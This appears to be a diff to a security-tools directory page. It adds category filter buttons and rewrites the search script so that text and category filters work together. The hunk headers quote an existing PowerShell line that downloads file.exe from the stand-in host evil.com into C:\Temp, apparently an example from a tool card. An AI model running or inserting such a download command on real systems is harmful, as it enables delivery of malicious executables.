@@ -23,6 +23,16 @@
   <main>
     <div class="search-container">
         <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords...">
+
+        <div class="category-filters" style="margin-top: 1rem; display: flex; justify-content: center; gap: 0.5rem; flex-wrap: wrap;">
+            <button class="button button-secondary filter-btn active" data-filter="all">All</button>
+            <button class="button button-secondary filter-btn" data-filter="Networking">Networking</button>
+            <button class="button button-secondary filter-btn" data-filter="Web">Web</button>
+            <button class="button button-secondary filter-btn" data-filter="Exploitation">Exploitation</button>
+            <button class="button button-secondary filter-btn" data-filter="Forensics">Forensics</button>
+            <button class="button button-secondary filter-btn" data-filter="OSINT">OSINT</button>
+            <button class="button button-secondary filter-btn" data-filter="AI">AI</button>
+        </div>
     </div>
 
     <div id="toolsGrid" class="grid-container">
@@ -324,16 +334,24 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
   <script>
     const searchInput = document.getElementById('searchInput');
     const toolCards = document.querySelectorAll('.tool-card');
+    const filterBtns = document.querySelectorAll('.filter-btn');
+    let currentCategory = 'all';
 
-    function filterTools(searchTerm) {
-        searchTerm = searchTerm.toLowerCase();
+    function filterTools() {
+        const searchTerm = searchInput.value.toLowerCase();
+
         toolCards.forEach(card => {
             const title = card.querySelector('.tool-title').textContent.toLowerCase();
             const keywords = card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '';
             const desc = card.querySelector('.tool-desc').textContent.toLowerCase();
             const flags = card.querySelector('.tool-flags') ? card.querySelector('.tool-flags').textContent.toLowerCase() : '';
+            const categoryElement = card.querySelector('.tool-category');
+            const category = categoryElement ? categoryElement.textContent.trim() : '';
 
-            if (title.includes(searchTerm) || keywords.includes(searchTerm) || desc.includes(searchTerm) || flags.includes(searchTerm)) {
+            const matchesSearch = title.includes(searchTerm) || keywords.includes(searchTerm) || desc.includes(searchTerm) || flags.includes(searchTerm);
+            const matchesCategory = currentCategory === 'all' || category.includes(currentCategory);
+
+            if (matchesSearch && matchesCategory) {
                 card.classList.remove('hidden');
             } else {
                 card.classList.add('hidden');
@@ -341,17 +359,35 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         });
     }
 
+    // Category Filters
+    filterBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            // Update active state
+            filterBtns.forEach(b => b.classList.remove('active'));
+            filterBtns.forEach(b => b.style.backgroundColor = ''); // Reset inline styles if any
+
+            btn.classList.add('active');
+            btn.style.backgroundColor = 'var(--accent-color)'; // Highlight active
+
+            currentCategory = btn.getAttribute('data-filter');
+            filterTools();
+        });
+    });
+
     // Check for query parameter
     const urlParams = new URLSearchParams(window.location.search);
     const query = urlParams.get('q');
     if (query) {
         searchInput.value = query;
-        filterTools(query);
+        filterTools();
     }
 
-    searchInput.addEventListener('input', (e) => {
-        filterTools(e.target.value);
+    searchInput.addEventListener('input', () => {
+        filterTools();
     });
+
+    // Initialize first button style
+    document.querySelector('.filter-btn[data-filter="all"]').style.backgroundColor = 'var(--accent-color)';
   </script>
 </body>
 </html>
